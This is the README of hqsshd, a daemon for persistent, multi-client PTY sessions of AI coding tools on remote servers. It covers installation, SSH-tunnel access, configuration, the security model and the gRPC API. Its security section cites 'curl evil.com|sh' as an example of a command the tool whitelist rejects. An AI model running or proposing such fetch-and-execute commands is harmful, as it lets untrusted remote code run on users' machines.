# hqsshd

A daemon for managing persistent PTY sessions for AI CLI tools (Claude Code, Codex, Aider) across remote systems.

## Overview

hqsshd provides session persistence and multi-client access for AI coding assistants running on remote servers. Start a Claude Code session on your server, detach, and reattach from any device - your session state is preserved.

**Key Features:**

- **Persistent Sessions** - AI tool sessions survive disconnects and continue running
- **Multi-Client Attach** - Multiple clients can attach to the same session simultaneously
- **Scrollback Buffer** - New clients receive session history on attach
- **Project Discovery** - Automatically discovers git repositories
- **Task Automation** - Define and run automated tasks with timeout support
- **Secure by Design** - Listens only on localhost; access via SSH tunnel

## Architecture

```
┌─────────────────┐         ┌─────────────────┐
│  HQSSH Mobile   │──SSH───▶│    hqsshd       │
│  (iOS/Android)  │ tunnel  │  (this daemon)  │
└─────────────────┘         └────────┬────────┘
                                     │
┌─────────────────┐                  │ manages
│  hqssh CLI      │──SSH────────────▶│
│  (desktop)      │ tunnel           ▼
└─────────────────┘         ┌─────────────────┐
                            │  PTY Sessions   │
                            │  claude, codex, │
                            │  aider, shell   │
                            └─────────────────┘
```

## Quick Install

```bash
curl -fsSL https://hqssh.com/install | sh
```

This downloads the latest release, verifies the checksum, installs both binaries (`hqsshd` + `hqssh`), and sets up a systemd user service. Re-run to update.

To pin a specific version:

```bash
curl -fsSL https://hqssh.com/install | HQSSH_VERSION=v0.3.0 sh
```

To uninstall:

```bash
curl -fsSL https://hqssh.com/install | sh -s -- --uninstall
```

## Manual Installation

### Prebuilt Binaries

Download the latest release for your platform from [GitHub Releases](https://github.com/gelotto/hqsshd/releases/latest):

```bash
# Linux (amd64)
curl -LO https://github.com/gelotto/hqsshd/releases/latest/download/hqsshd-linux-amd64.tar.gz
tar xzf hqsshd-linux-amd64.tar.gz
sudo mv hqsshd hqssh /usr/local/bin/

# Linux (arm64)
curl -LO https://github.com/gelotto/hqsshd/releases/latest/download/hqsshd-linux-arm64.tar.gz
tar xzf hqsshd-linux-arm64.tar.gz
sudo mv hqsshd hqssh /usr/local/bin/

# macOS (Apple Silicon)
curl -LO https://github.com/gelotto/hqsshd/releases/latest/download/hqsshd-darwin-arm64.tar.gz
tar xzf hqsshd-darwin-arm64.tar.gz
sudo mv hqsshd hqssh /usr/local/bin/

# macOS (Intel)
curl -LO https://github.com/gelotto/hqsshd/releases/latest/download/hqsshd-darwin-amd64.tar.gz
tar xzf hqsshd-darwin-amd64.tar.gz
sudo mv hqsshd hqssh /usr/local/bin/
```

Verify:
```bash
hqsshd --version
```

### From Source

Requires Go 1.25+:

```bash
git clone https://github.com/gelotto/hqsshd.git
cd hqsshd
make build
make install-user  # Installs to ~/.local/bin
```

### Systemd Service (Recommended)

Install as a user service for auto-start:

```bash
# Copy service file
mkdir -p ~/.config/systemd/user
cp hqsshd.service ~/.config/systemd/user/

# Enable and start
systemctl --user daemon-reload
systemctl --user enable hqsshd
systemctl --user start hqsshd

# View logs
journalctl --user -u hqsshd -f
```

## Usage

### Daemon

```bash
# Run daemon (foreground)
hqsshd

# With custom config
hqsshd --config /path/to/config.yaml

# Check version
hqsshd --version
```

### CLI (hqssh)

The CLI connects to the daemon via SSH tunnel:

```bash
# List sessions on remote host
hqssh sessions -H myserver.com -u myuser

# Attach to a session
hqssh attach <session-id> -H myserver.com -u myuser

# Detach from session: Ctrl+B, then D
```

**SSH Authentication:**
- Uses your default SSH keys (`~/.ssh/id_ed25519`, `~/.ssh/id_rsa`)
- Verifies host keys against `~/.ssh/known_hosts`
- Use `--insecure` to skip host key verification (not recommended)

## Configuration

Default config location: `~/.hqssh/daemon.yaml`

```yaml
# Session settings
session:
  idle_timeout_sec: 3600    # Kill idle sessions after 1 hour (0 = disabled)
  max_sessions: 10          # Maximum concurrent sessions
  history_lines: 10000      # Scrollback buffer size

# Server settings
server:
  socket_path: /tmp/hqssh.sock  # Unix socket for local tools
  tcp_port: 50051               # TCP port for SSH tunnel access
```

## Security

### Security Model

hqsshd delegates authentication entirely to the transport layer — it trusts all connections on its listeners. This is the same trust model used by Docker daemon, gpg-agent, and ssh-agent.

**How access is controlled:**

| Listener | Protection | Who can connect |
|----------|-----------|----------------|
| Unix socket (`/tmp/hqssh.sock`) | File permissions `0600` | Only the daemon's owning user |
| TCP (`127.0.0.1:50051`) | Loopback bind + SSH tunnel | Any local user, or remote users via SSH |

**Important: multi-user systems.** The TCP listener on `127.0.0.1:50051` is accessible to *all* local users on the machine, not just the daemon's owner. On shared systems (university servers, CI runners, shared dev boxes), this means other users could connect to your daemon and spawn sessions as your user.

**Mitigation for multi-user systems:** Set `tcp_port: 0` in `~/.hqssh/daemon.yaml` to disable the TCP listener entirely. The daemon will only accept connections via the Unix socket (which is protected by filesystem permissions). Remote clients can still connect by forwarding the Unix socket over SSH:

```bash
# Client connects via Unix socket forwarding instead of TCP
ssh -L /tmp/hqssh-remote.sock:/tmp/hqssh.sock user@host
```

### Defense in Depth

Even without gRPC-layer authentication, hqsshd applies input validation to limit blast radius:

- **Tool whitelist** - Session and task creation only accept tool names from `daemon.yaml` config (e.g., `claude`, `codex`, `aider`, `shell`). Arbitrary commands like `curl evil.com|sh` are rejected.
- **Prompt injection prevention** - AI tool prompts are passed as shell positional arguments (`$1`), never interpolated into shell command strings.
- **Path traversal protection** - Session log access validates that session IDs cannot escape the log directory.

### Summary

- **Local-only by default** - TCP server binds to `127.0.0.1`, accessible only via SSH tunnel
- **Transport-layer auth** - Relies on SSH for authentication and encryption
- **Minimal privileges** - Runs as your user, no root required
- **Open source** - Full source code available for audit

**What hqsshd does:**
- Spawns PTY processes for AI tools (claude, codex, aider, shell)
- Manages session lifecycle (create, attach, detach, kill)
- Discovers git repositories in specified directories
- Executes user-defined tasks with configurable timeouts

**What hqsshd does NOT do:**
- Phone home or collect telemetry
- Store credentials or secrets
- Modify system configuration
- Run with elevated privileges

## gRPC API

hqsshd exposes a gRPC API for programmatic access:

| Service | Description |
|---------|-------------|
| `SystemService` | System info and health status |
| `ProjectService` | Git repository discovery and management |
| `SessionService` | PTY session lifecycle management |
| `TaskService` | Automated task execution |

Proto definitions: [`proto/hqssh.proto`](proto/hqssh.proto)

## Building

```bash
# Install dependencies
make deps

# Regenerate proto (if modified)
make proto

# Build binaries
make build

# Run tests
make test

# Clean build artifacts
make clean
```

## Data Storage

All data is stored in `~/.hqssh/`:

| File | Purpose |
|------|---------|
| `daemon.yaml` | Configuration (optional) |
| `projects.json` | Registered projects |
| `tasks.json` | Task definitions |
| `runs/` | Task execution history |

## License

Apache License 2.0 - See [LICENSE](LICENSE)

## Contributing

Contributions welcome! Please open an issue to discuss significant changes before submitting a PR.
